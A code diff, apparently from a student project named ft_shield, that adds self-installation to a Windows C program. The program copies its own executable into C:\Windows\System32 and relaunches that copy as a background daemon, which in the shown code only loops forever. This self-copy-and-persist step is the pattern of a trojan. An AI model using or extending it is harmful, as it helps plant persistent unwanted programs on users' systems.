@@ -6,22 +6,23 @@
 /*   By: zcadinot <zcadinot@student.42lehavre.      +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2026/10/19 18:02:57 by zcadinot          #+#    #+#             */
-/*   Updated: 2026/10/20 15:08:59 by zcadinot         ###   ########.fr       */
+/*   Updated: 2026/10/20 16:09:22 by zcadinot         ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#include "ft_sheild.h"
+#include "ft_shield.h"
 #include <lmcons.h>
 #include <stdio.h>
 
 int mode_daemon()
 {
-    printf("Mode_Daemon");
+    printf("Mode_Daemon\n");
+    fflush(stdout);
     while (1)
     {
         continue;
     }
-    return (0);
+    return (1);
 }
 
 int mode_normal()
@@ -31,9 +32,42 @@ int mode_normal()
 
     char login[UNLEN + 1];
     DWORD size = sizeof(login);
+    char *mpath;
 
     if (!GetUserNameA(login, &size))
+    {
+        printf("Erreur : %lu\n", (unsigned long)GetLastError());
+        return (0);
+    }
+
+    if ((mpath = get_my_path()) == NULL)
+    {
+        printf("Erreur : %lu\n", (unsigned long)GetLastError());
+        return (0);
+    }
+
+    const char *dst = "C:\\Windows\\System32\\ft_shield.exe";
+
+    if (!CopyFileA(mpath, dst, TRUE))
+    {
+        printf("Erreur : %lu\n", (unsigned long)GetLastError());
         return (1);
+    }
+
+    STARTUPINFOW si = {0};
+    PROCESS_INFORMATION pi = {0};
+    WCHAR command_line[] =
+        L"\"C:\\Windows\\System32\\ft_shield.exe\" --daemon";
+
+    si.cb = sizeof(si);
+    if (!CreateProcessW(L"C:\\Windows\\System32\\ft_shield.exe", command_line, NULL, NULL, FALSE, 0, NULL, NULL, &si, &pi))
+    {
+        printf("CreateProcessW erreur : %lu\n",
+            (unsigned long)GetLastError());
+        return (1);
+    }
+    CloseHandle(pi.hThread);
+    CloseHandle(pi.hProcess);
 
     printf("%s\n", login);
 
@@ -41,7 +75,7 @@ int mode_normal()
     {
         continue;
     }
-    return (0);
+    return (1);
 }
 
 int main(int argc, char **argv)
